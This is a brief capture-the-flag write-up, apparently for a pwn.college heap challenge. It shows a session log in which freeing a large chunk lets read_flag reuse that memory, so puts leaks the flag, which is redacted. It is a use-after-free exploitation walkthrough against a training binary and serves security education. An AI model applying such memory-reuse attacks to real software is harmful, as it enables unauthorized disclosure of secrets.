 /babyheap_level2_testing1
```
###
### Welcome to /babyheap_level2_testing1!
###
[*] Function (malloc/free/puts/read_flag/quit): malloc
Size: 9999
[*] allocations[0] = 0x562827be8ac0
[*] Function (malloc/free/puts/read_flag/quit): free
[*] Function (malloc/free/puts/read_flag/quit): read_flag
[*] flag_buffer = 0x562827be8ac0
[*] Function (malloc/free/puts/read_flag/quit): puts
Data: pwn_college{redacted_flag}

[*] Function (malloc/free/puts/read_flag/quit): quit
```

We need to free a large amount of memory so it remains together when we read the flag into it
